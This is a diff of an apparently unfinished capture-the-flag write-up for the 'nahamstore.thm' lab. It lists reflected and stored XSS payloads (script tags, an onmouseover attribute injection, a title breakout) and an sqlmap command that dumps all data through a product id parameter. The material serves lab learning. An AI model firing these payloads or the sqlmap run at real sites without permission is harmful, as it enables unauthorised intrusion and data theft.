@@ -75,17 +75,17 @@ Seemed interesting and further enumeration there we find a login to the Marketin
 
 ### URL Endpoint vulnerable to XSS
 
-URL encoded GET input error was set to `1'"()&%<script>g6VL(9778)</script>`
+- `http://marketing.nahamstore.thm/?error=`
 
-- `http://marketing.nahamstore.thm/ , error`
+URL encoded GET input error was set to `1'"()&%<script>alert()</script>`
 
 ### Stored XSS
 
 The User-Agent HTTP header can be used to create stored XSS
 
-### Hidden parameter on the shop home page
+### Hidden parameter on the product page
 
-URL encoded GET input q was set to 1"onmouseover=NmOf(9157)"
+- URL encoded GET input q was set to 1"onmouseover=alert(boo)"
 
 The input is reflected inside a tag parameter between double quotes. 
 
@@ -93,9 +93,7 @@ The input is reflected inside a tag parameter between double quotes.
 
 The vulnerability affects `http://nahamstore.thm/product` 
 
-URL encoded GET input name was set to `Sticker Pack</title><ScRiPt >eM3M(9217)</ScRiPt>`
-
-
+URL encoded GET input name was set to `Sticker Pack</title><script>alert()</script>`
 
 ### Returns Page
 
@@ -118,7 +116,6 @@ sqlmap -u http://nahamstore.thm/product?id=2 --batch --all
 
 
 
+Page is incomplete as I am working on the room currently
 
-
-```
 
